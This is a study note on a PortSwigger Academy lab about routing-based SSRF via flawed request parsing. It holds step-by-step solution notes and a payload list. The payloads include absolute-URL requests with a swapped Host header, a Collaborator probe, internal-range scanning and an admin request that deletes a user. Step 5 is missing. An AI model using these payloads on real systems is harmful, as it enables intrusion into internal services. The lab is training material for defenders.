# Lab: SSRF via flawed request parsing

**Official lab:** [SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)

**Lab idea:** The challenge demonstrates routing-based SSRF caused by flawed parsing of the request's intended host, despite apparent validation of the Host header. It practices examining how request targets and host information are interpreted across components, with the high-level objective of reaching an internal admin interface.

## Vulnerability in brief
HTTP Host header attacks exploit unsafe handling of the `Host` request header, which identifies the domain or virtual host a client intends to reach. Servers, reverse proxies, load balancers, and applications may rely on this value to route requests or build absolute URLs. When components trust an attacker-controlled value without consistent validation or escaping, the header can influence behavior beyond selecting a site. This topic is a vulnerability class, not a general testing category.

## Solution idea
1. Send the GET / request that received a 200 response to Burp Repeater and study the lab's behavior.
2. Observe that you can also access the home page by supplying an absolute URL in the request line as follows: GET https://YOUR-LAB-ID.web-security-academy.net/
3. Notice that when you do this, modifying the Host header no longer causes your request to be blocked.
4. Use Burp Collaborator to confirm that you can make the website's middleware issue requests to an arbitrary server in this way.
- …
6. Copy the session cookie from the Set-Cookie header in the displayed response and add it to your request.
7. Right-click on your request and select "Change request method".
8. Send the request to delete carlos and solve the lab.

## Payloads / key values
- `GET /`
- `200`
- `GET https://YOUR-LAB-ID.web-security-academy.net/`
- `GET https://YOUR-LAB-ID.web-security-academy.net/ Host: BURP-COLLABORATOR-SUBDOMAIN`
- `192.168.0.0/24`
- `/admin`
- `/admin/delete`
- `username`
- `carlos`
- `GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos`
- `Set-Cookie`
- `POST`

## Official source
- [PortSwigger Academy: Lab: SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)
